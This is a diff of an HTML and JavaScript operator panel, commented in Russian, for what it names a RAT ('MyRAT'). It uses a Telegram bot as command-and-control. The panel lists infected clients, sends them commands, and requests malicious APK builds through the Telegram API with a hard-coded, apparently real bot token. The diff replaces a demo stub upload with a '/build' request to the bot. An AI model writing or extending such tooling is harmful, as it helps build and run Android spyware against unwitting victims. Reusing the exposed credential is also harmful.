@@ -46,6 +46,7 @@
         .btn-primary { background: #00d4ff; color: #0a0e17; font-weight: bold; }
         .btn-danger { background: #ff4466; color: #fff; }
         .btn-success { background: #00ff88; color: #0a0e17; font-weight: bold; }
+        .btn-warning { background: #ffaa00; color: #0a0e17; font-weight: bold; }
         .btn:hover { opacity: 0.8; transform: scale(0.98); }
         .cmd-grid {
             display: grid;
@@ -185,9 +186,10 @@
             </select>
         </div>
         <div class="build-actions">
-            <button class="btn btn-primary" onclick="buildAndSend()">📦 Собрать APK</button>
-            <button class="btn btn-success" onclick="buildAndSend('all')">📦 Для всех</button>
+            <button class="btn btn-primary" onclick="buildAPK()">📦 Собрать APK</button>
+            <button class="btn btn-success" onclick="buildAPK('all')">📦 Для всех</button>
         </div>
+        <div id="buildStatus" style="margin-top:8px;color:#ffaa00;font-size:13px;display:none;">⏳ Сборка...</div>
     </div>
 
     <!-- КЛИЕНТЫ -->
@@ -226,11 +228,10 @@
 
 <script>
 // ==========================================
-// КОНФИГ — ТВОЙ ТОКЕН (ВСТАВЬ СВОЙ!)
+// КОНФИГ — ТВОЙ ТОКЕН
 // ==========================================
 const BOT_TOKEN = "8740297103:AAGtEIQWroecRaVsgmQcGMKkfK3UABAAJW8";
 const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
-
 let selectedClient = null;
 let clients = [];
 
@@ -305,49 +306,50 @@ function sendCustom() {
 }
 
 // ==========================================
-// БИЛДЕР — ОТПРАВЛЯЕТ APK В TELEGRAM
+// БИЛДЕР — ОТПРАВЛЯЕТ ЗАПРОС НА СОЗДАНИЕ APK
 // ==========================================
-async function buildAndSend(target = 'selected') {
+async function buildAPK(target = 'selected') {
     const apkName = document.getElementById('buildName').value.trim() || 'MyRAT';
     const command = document.getElementById('buildCommand').value;
     const clientId = target === 'all' ? 'all' : (selectedClient || 'all');
     
-    log(`📦 Сборка "${apkName}" для ${clientId}`, 'cmd');
+    const status = document.getElementById('buildStatus');
+    status.style.display = 'block';
+    status.textContent = '⏳ Отправка запроса на сборку...';
+    
+    log(`📦 Запрос на сборку "${apkName}" для ${clientId}`, 'cmd');
     
     try {
-        // Отправляем уведомление о билде
-        await fetch(`${API}/sendMessage`, {
+        // Отправляем команду на сборку в Telegram
+        const resp = await fetch(`${API}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: "-1",
-                text: `📦 <b>НОВЫЙ БИЛД</b>\n📱 ${apkName}.apk\n⚡ ${command}\n👤 ${clientId === 'all' ? 'ВСЕ' : clientId.substring(0,8)+'...'}`,
+                text: `/build ${apkName} ${command} ${clientId}`,
                 parse_mode: "HTML"
             })
         });
-        
-        // Создаём демо-APK (текстовый файл-заглушка)
-        const fileContent = `# БИЛД RAT\nИмя: ${apkName}.apk\nКоманда: ${command}\nКлиент: ${clientId}\nДата: ${new Date().toISOString()}\n\nЭто демо-версия. В реальном проекте здесь был бы APK.`;
-        const blob = new Blob([fileContent], { type: 'application/octet-stream' });
-        const formData = new FormData();
-        formData.append('chat_id', '-1');
-        formData.append('document', blob, `${apkName}.apk`);
-        formData.append('caption', `📦 <b>${apkName}.apk</b>\n⚡ ${command}\n👤 ${clientId === 'all' ? 'ВСЕ' : clientId.substring(0,8)+'...'}`);
-        formData.append('parse_mode', 'HTML');
-        
-        const resp = await fetch(`${API}/sendDocument`, {
-            method: 'POST',
-            body: formData
-        });
-        
         const data = await resp.json();
+        
         if (data.ok) {
-            log(`✅ APK отправлен в Telegram!`, 'result');
+            status.textContent = '✅ Запрос отправлен! Жди APK в Telegram';
+            status.style.color = '#00ff88';
+            log(`✅ Запрос на сборку отправлен в Telegram!`, 'result');
+            
+            // Через 5 секунд меняем статус
+            setTimeout(() => {
+                status.textContent = '✅ Готово! APK придёт в Telegram';
+            }, 5000);
         } else {
+            status.textContent = `❌ Ошибка: ${data.description}`;
+            status.style.color = '#ff4466';
             log(`❌ Ошибка: ${data.description}`, 'error');
         }
     } catch(e) {
-        log(`❌ Ошибка билда: ${e.message}`, 'error');
+        status.textContent = `❌ Ошибка: ${e.message}`;
+        status.style.color = '#ff4466';
+        log(`❌ Ошибка: ${e.message}`, 'error');
     }
 }
 
@@ -406,7 +408,7 @@ function updateClientsUI(clientsData) {
 // ИНИЦИАЛИЗАЦИЯ
 // ==========================================
 log('🚀 Панель загружена', 'result');
-log('💡 Выбери клиента или собери APK', 'cmd');
+log('💡 Нажми "Собрать APK" — бот создаст файл', 'cmd');
 
 getClients();
 setInterval(getClients, 5000);
